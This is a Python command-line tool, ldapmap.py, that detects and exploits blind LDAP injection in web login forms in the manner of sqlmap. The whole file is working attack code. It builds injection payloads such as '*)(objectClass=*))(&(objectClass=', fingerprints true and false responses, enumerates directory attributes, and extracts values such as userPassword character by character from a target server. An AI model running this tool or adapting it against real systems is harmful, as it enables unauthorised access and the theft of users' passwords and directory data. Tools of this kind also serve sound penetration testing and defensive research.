#!/usr/bin/env python3
"""
ldapmap.py — Blind LDAP Injection Scanner and Extractor
========================================================
A command-line tool that automatically detects and exploits LDAP Injection
vulnerabilities using blind boolean-based techniques, similar in concept to
sqlmap for SQL injection.

Usage examples:
    # Detect injection in a POST form parameter
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" -p pass

    # Extract the value of the 'userPassword' attribute
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
        -p pass --extract userPassword

    # Route traffic through Burp Suite for debugging
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
        -p pass --proxy http://127.0.0.1:8080

    # Enable verbose mode to log every outgoing payload
    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
        -p pass --verbose
"""

import argparse
import sys
import string
from urllib.parse import quote, urlencode, parse_qs

import requests


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Characters tested during blind extraction (ordered to try common chars first)
CHARSET = (
    string.ascii_lowercase
    + string.ascii_uppercase
    + string.digits
    + "!@#$%^&*-_+=<>?/.,;:'\"`~|\\{}"
)

# LDAP attributes checked when --extract is not specified
COMMON_ATTRIBUTES = [
    "uid",
    "cn",
    "sn",
    "mail",
    "givenName",
    "displayName",
    "userPassword",
    "description",
    "telephoneNumber",
    "memberOf",
    "objectClass",
]

# Payloads used to detect raw injection errors
DETECTION_PAYLOADS = [
    "*",
    "(",
    ")",
    "\\",
    "\x00",
    "*)(objectClass=*))(&(objectClass=",
    "*))(|(objectClass=*",
    "*()|%26",
]

# Payloads used to distinguish AND-wrapped vs OR-wrapped queries
LOGIC_PAYLOADS = {
    "AND_true": "*)(objectClass=*))(&(objectClass=",
    "OR_true": "*))(|(objectClass=*",
}

# Tolerance (in bytes) for response-length comparison
LENGTH_TOLERANCE = 20

# Request timeout in seconds
TIMEOUT = 10


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------


def build_session(proxy: str | None) -> requests.Session:
    """Create and return a requests.Session optionally configured with a proxy."""
    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
        # Disable SSL verification when using a proxy (e.g. Burp Suite)
        session.verify = False
    return session


def send_request(
    session: requests.Session,
    url: str,
    data: dict,
    verbose: bool = False,
) -> requests.Response | None:
    """
    Send a POST request and return the response.

    When *verbose* is True, each outgoing payload is printed to stdout before
    the request is dispatched.

    Returns None on connection errors so callers can handle failures gracefully.
    """
    if verbose:
        print(f"[V] POST {url}  data={urlencode(data)}")
    try:
        resp = session.post(url, data=data, timeout=TIMEOUT)
        return resp
    except requests.exceptions.ConnectionError as exc:
        print(f"[!] Connection error: {exc}", file=sys.stderr)
        return None
    except requests.exceptions.Timeout:
        print("[!] Request timed out.", file=sys.stderr)
        return None
    except requests.exceptions.RequestException as exc:
        print(f"[!] Unexpected request error: {exc}", file=sys.stderr)
        return None


# ---------------------------------------------------------------------------
# Payload construction
# ---------------------------------------------------------------------------


def build_payload_data(
    base_data: dict,
    param: str,
    injection: str,
) -> dict:
    """
    Return a copy of *base_data* with *param* replaced by *injection*.

    The injection string is URL-encoded before being substituted so that
    special LDAP characters travel correctly over HTTP.
    """
    payload_data = dict(base_data)
    # quote() encodes characters that would break the form field; the server
    # decodes them back before passing the value to the LDAP query.
    payload_data[param] = quote(injection, safe="")
    return payload_data


# ---------------------------------------------------------------------------
# Baseline & true/false calibration
# ---------------------------------------------------------------------------


def get_baseline(
    session: requests.Session,
    url: str,
    base_data: dict,
    verbose: bool = False,
) -> tuple[int, int]:
    """
    Send an unmodified request and return *(status_code, content_length)*.

    This baseline is used to detect deviations caused by injected payloads.
    """
    resp = send_request(session, url, base_data, verbose)
    if resp is None:
        print("[!] Could not reach target for baseline request. Aborting.", file=sys.stderr)
        sys.exit(1)
    length = len(resp.content)
    print(f"[*] Baseline — HTTP {resp.status_code}, length={length}")
    return resp.status_code, length


def is_true_response(
    resp: requests.Response | None,
    true_status: int,
    true_length: int,
) -> bool:
    """
    Return True when *resp* looks like a successful ("true") LDAP result.

    A response is considered "true" when:
      - the HTTP status code matches the baseline, AND
      - the content length is within LENGTH_TOLERANCE bytes of the baseline.
    """
    if resp is None:
        return False
    length_match = abs(len(resp.content) - true_length) <= LENGTH_TOLERANCE
    status_match = resp.status_code == true_status
    return status_match and length_match


def calibrate(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
) -> tuple[int, int]:
    """
    Attempt to identify a "true" response signature by injecting a wildcard.

    Sends *(param)=** which should match any LDAP entry and return a "true"
    response.  If that wildcard response differs from the baseline we swap the
    reference values so that subsequent checks compare against the correct
    "true" fingerprint.

    Returns the (status, length) pair that represents a TRUE response.
    """
    wildcard_data = build_payload_data(base_data, param, "*")
    resp = send_request(session, url, wildcard_data, verbose)
    if resp is None:
        return true_status, true_length

    wc_length = len(resp.content)
    wc_status = resp.status_code

    if wc_status != true_status or abs(wc_length - true_length) > LENGTH_TOLERANCE:
        # The wildcard produced a different response — use it as the TRUE marker
        print(
            f"[*] Calibration: wildcard response differs from baseline. "
            f"Using wildcard signature as TRUE (HTTP {wc_status}, length={wc_length})."
        )
        return wc_status, wc_length

    print(f"[*] Calibration: wildcard matches baseline (HTTP {wc_status}, length={wc_length}).")
    return true_status, true_length


# ---------------------------------------------------------------------------
# Detection module
# ---------------------------------------------------------------------------


def detect_injection(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
) -> bool:
    """
    Probe the target with common LDAP meta-characters and logic payloads.

    Prints a report of which payloads caused a different response, which
    indicates that the parameter is embedded in an LDAP query without sanitization.

    Returns True if at least one payload produced a distinguishable response.
    """
    print("\n[*] --- Detection Phase ---")
    vulnerable = False

    for payload in DETECTION_PAYLOADS:
        data = build_payload_data(base_data, param, payload)
        resp = send_request(session, url, data, verbose)
        if resp is None:
            continue
        length = len(resp.content)
        different = (
            resp.status_code != true_status
            or abs(length - true_length) > LENGTH_TOLERANCE
        )
        marker = "[!] DIFFERENT" if different else "    same     "
        print(
            f"  {marker}  payload={repr(payload):<40} "
            f"HTTP {resp.status_code}, length={length}"
        )
        if different:
            vulnerable = True

    # AND / OR logic probes
    print("\n[*] AND/OR logic probes:")
    for label, payload in LOGIC_PAYLOADS.items():
        data = build_payload_data(base_data, param, payload)
        resp = send_request(session, url, data, verbose)
        if resp is None:
            continue
        looks_true = is_true_response(resp, true_status, true_length)
        print(
            f"  [{label}] payload={repr(payload):<50} "
            f"→ {'TRUE' if looks_true else 'FALSE'}"
        )
        if looks_true:
            vulnerable = True

    return vulnerable


# ---------------------------------------------------------------------------
# Attribute discovery module
# ---------------------------------------------------------------------------


def discover_attributes(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
) -> list[str]:
    """
    Iterate through COMMON_ATTRIBUTES and test each with a wildcard payload.

    The payload format is: )(attribute=*)
    A "true" response implies that attribute exists on the LDAP entry.

    Returns the list of attributes that appear to exist.
    """
    print("\n[*] --- Attribute Discovery Phase ---")
    found: list[str] = []

    for attr in COMMON_ATTRIBUTES:
        payload = f")({attr}=*)"
        data = build_payload_data(base_data, param, payload)
        resp = send_request(session, url, data, verbose)
        if resp is None:
            continue
        if is_true_response(resp, true_status, true_length):
            print(f"  [+] Attribute present: {attr}")
            found.append(attr)
        else:
            print(f"  [-] Attribute absent:  {attr}")

    return found


# ---------------------------------------------------------------------------
# Data extraction module (blind char-by-char)
# ---------------------------------------------------------------------------


def extract_attribute(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    attribute: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
) -> str:
    """
    Extract the value of *attribute* one character at a time using LDAP wildcards.

    For each position the function tries every character in CHARSET by sending
    a payload of the form:
        )(attribute=<known_prefix><candidate>*)

    When the response looks "true" the candidate character is appended to the
    known prefix and the search moves to the next position.

    The discovered value is printed incrementally to stdout.

    Returns the fully extracted value string.
    """
    print(f"\n[*] --- Extraction Phase: {attribute} ---")
    extracted = ""
    print(f"  [*] Extracting {attribute}: ", end="", flush=True)

    while True:
        found_char = False
        for char in CHARSET:
            # Build blind payload: )(attr=<prefix><char>*)
            payload = f")({attribute}={extracted}{char}*)"
            data = build_payload_data(base_data, param, payload)
            resp = send_request(session, url, data, verbose)
            if resp is None:
                continue
            if is_true_response(resp, true_status, true_length):
                extracted += char
                print(char, end="", flush=True)
                found_char = True
                break  # Move to next position

        if not found_char:
            # No character matched — value is fully extracted
            break

    print()  # Newline after the extracted value
    return extracted


# ---------------------------------------------------------------------------
# CLI argument parsing
# ---------------------------------------------------------------------------


def parse_args() -> argparse.Namespace:
    """Define and parse command-line arguments."""
    parser = argparse.ArgumentParser(
        prog="ldapmap",
        description=(
            "Blind LDAP Injection Scanner and Extractor.\n"
            "Detect and exploit LDAP injection vulnerabilities automatically."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "-u", "--url",
        required=True,
        metavar="URL",
        help="Target URL (e.g., http://target/login)",
    )
    parser.add_argument(
        "-d", "--data",
        required=True,
        metavar="DATA",
        help='POST form data, e.g. "username=admin&password=INJECT_HERE"',
    )
    parser.add_argument(
        "-p", "--param",
        required=True,
        metavar="PARAM",
        help="Name of the parameter to inject into (e.g., password)",
    )
    parser.add_argument(
        "--proxy",
        metavar="PROXY",
        default=None,
        help="Optional HTTP proxy URL (e.g., http://127.0.0.1:8080)",
    )
    parser.add_argument(
        "--extract",
        metavar="ATTRIBUTE",
        default=None,
        help=(
            "LDAP attribute whose value should be extracted "
            "(e.g., userPassword). If omitted, attribute discovery is run."
        ),
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        default=False,
        help="Print every outgoing POST payload to stdout.",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def main() -> None:
    """Main orchestration function."""
    args = parse_args()

    # Parse form data string into a dict (parse_qs returns lists; flatten them)
    parsed = parse_qs(args.data, keep_blank_values=True)
    base_data = {k: v[0] for k, v in parsed.items()}

    if args.param not in base_data:
        print(
            f"[!] Parameter '{args.param}' not found in --data. "
            "Check spelling and try again.",
            file=sys.stderr,
        )
        sys.exit(1)

    print(f"[*] Target  : {args.url}")
    print(f"[*] Param   : {args.param}")
    if args.proxy:
        print(f"[*] Proxy   : {args.proxy}")
    if args.verbose:
        print("[*] Verbose : enabled")

    session = build_session(args.proxy)

    # 1. Baseline
    true_status, true_length = get_baseline(session, args.url, base_data, args.verbose)

    # 2. Calibrate TRUE fingerprint
    true_status, true_length = calibrate(
        session, args.url, base_data, args.param, true_status, true_length, args.verbose
    )

    # 3. Detection
    vulnerable = detect_injection(
        session, args.url, base_data, args.param, true_status, true_length, args.verbose
    )

    if not vulnerable:
        print(
            "\n[*] No distinguishable differences detected. "
            "The parameter may not be injectable, or the responses are indistinguishable."
        )
    else:
        print("\n[+] Parameter appears to be injectable!")

    # 4. Attribute discovery or extraction
    if args.extract:
        value = extract_attribute(
            session, args.url, base_data, args.param,
            args.extract, true_status, true_length, args.verbose,
        )
        if value:
            print(f"\n[+] Extracted {args.extract} = {value}")
        else:
            print(f"\n[-] Could not extract value for attribute '{args.extract}'.")
    else:
        attrs = discover_attributes(
            session, args.url, base_data, args.param, true_status, true_length, args.verbose
        )
        if attrs:
            print(f"\n[+] Discovered attributes: {', '.join(attrs)}")
            print("[*] Re-run with --extract <attribute> to retrieve the full value.")
        else:
            print("\n[-] No common attributes discovered.")


if __name__ == "__main__":
    main()
